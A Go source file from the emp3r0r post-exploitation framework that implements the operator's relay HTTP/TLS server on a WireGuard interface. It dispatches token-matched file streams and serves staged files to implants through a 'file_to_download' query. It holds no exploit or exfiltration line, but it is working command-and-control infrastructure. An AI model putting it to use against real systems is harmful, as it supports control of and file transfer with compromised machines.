package operator

import (
	"fmt"
	"net/http"
	"path/filepath"
	"time"

	"github.com/gorilla/mux"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// This server handles relayed HTTP requests from C2, it listens on WireGuard interface
func RelayHTTP2Server() {
	time.Sleep(3 * time.Second)
	r := mux.NewRouter()
	r.HandleFunc(fmt.Sprintf("/%s/{api}/{token}", transport.WebRoot), dispatcher)
	listenAddr := fmt.Sprintf("%s:1025", netutil.WgOperatorIP)
	err := http.ListenAndServeTLS(listenAddr, transport.OperatorServerCrtFile, transport.OperatorServerKeyFile, r)
	if err != nil {
		logging.Errorf("Failed to start HTTP server: %v", err)
	}
}

func dispatcher(w http.ResponseWriter, r *http.Request) {
	api := mux.Vars(r)["api"]
	token := mux.Vars(r)["token"]

	switch api {
	case transport.GetAPI:
		for _, sh := range network.FTPStreams {
			if token == sh.Token {
				handleFTPTransfer(sh, w, r)
				return
			}
		}
		w.WriteHeader(http.StatusNotFound)
	case transport.PutAPI:
		path := filepath.Clean(r.URL.Query().Get("file_to_download"))
		path = filepath.Base(path)
		logging.Debugf("FileAPI request for file: %s, URL: %s", path, r.URL)
		local_path := fmt.Sprintf("%s/%s/%s", live.Temp, transport.WWW, path)
		if !util.IsExist(local_path) {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		http.ServeFile(w, r, local_path)
	}
}
